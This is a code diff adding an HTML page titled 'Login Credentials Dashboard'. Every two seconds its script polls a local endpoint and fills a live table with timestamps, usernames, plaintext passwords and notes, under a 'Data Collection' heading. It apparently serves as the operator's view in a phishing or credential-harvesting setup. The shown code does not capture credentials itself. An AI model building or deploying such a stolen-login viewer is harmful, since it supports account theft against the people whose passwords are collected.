@@ -1,0 +1,53 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Login Credentials Dashboard — Live (Polling)</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; max-width: 1000px; margin: auto; }
+    table { border-collapse: collapse; width: 100%; }
+    th, td { border: 1px solid #999; padding: 6px; text-align: left; }
+    .notice { color: darkred; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>Dashboard — Live (Polling)</h1>
+  <p class="notice">Data Collection</p>
+  <p>Last update: <span id="last">never</span></p>
+  <table id="tbl">
+    <thead><tr><th>Time:</th><th>Username:</th><th>Password:</th><th>Notes:</th></tr></thead>
+    <tbody></tbody>
+  </table>
+
+  <script>
+    function escapeHtml(s){
+      if(!s) return '';
+      return String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[c]);
+    }
+
+    async function fetchAndUpdate(){
+      try{
+        const res = await fetch('/dashboard');
+        if(!res.ok) throw new Error('network');
+        const data = await res.json();
+        const tbody = document.querySelector('#tbl tbody');
+        tbody.innerHTML = '';
+        data.forEach(s => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `<td>${escapeHtml(s.timestamp)}</td>
+                          <td>${escapeHtml(s.username)}</td>
+                          <td>${escapeHtml(s.password)}</td>
+                          <td>${escapeHtml(s.notes)}</td>`;
+          tbody.appendChild(tr);
+        });
+        document.getElementById('last').textContent = new Date().toLocaleTimeString();
+      }catch(e){
+        console.error('Failed to fetch dashboard:', e);
+      }
+    }
+
+    fetchAndUpdate();
+    setInterval(fetchAndUpdate, 2000);
+  </script>
+</body>
+</html>
